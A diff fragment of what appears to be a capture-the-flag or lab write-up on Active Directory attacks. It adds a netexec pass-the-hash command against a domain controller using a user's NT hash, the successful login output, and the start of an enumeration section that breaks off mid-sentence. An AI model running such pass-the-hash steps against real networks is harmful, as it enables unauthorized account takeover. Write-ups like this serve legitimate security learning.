@@ -1241,6 +1241,16 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 I now have the NT hash for the user!
 
 ```python
-
+nxc smb dc01.ctos.corp -u it_ops_lead -H 'fd8bd0720fec58d0b5005257dd9f3723'  
+SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\it_ops_lead:fd8bd0720fec58d0b5005257dd9f3723 
 ```
+
+This user is now compromised!
+
+# Enumeration on `it_ops_lead`
+
+![](Pasted%20image%2020260902152457.png)
+
+I have AddMember on the policy autom
 
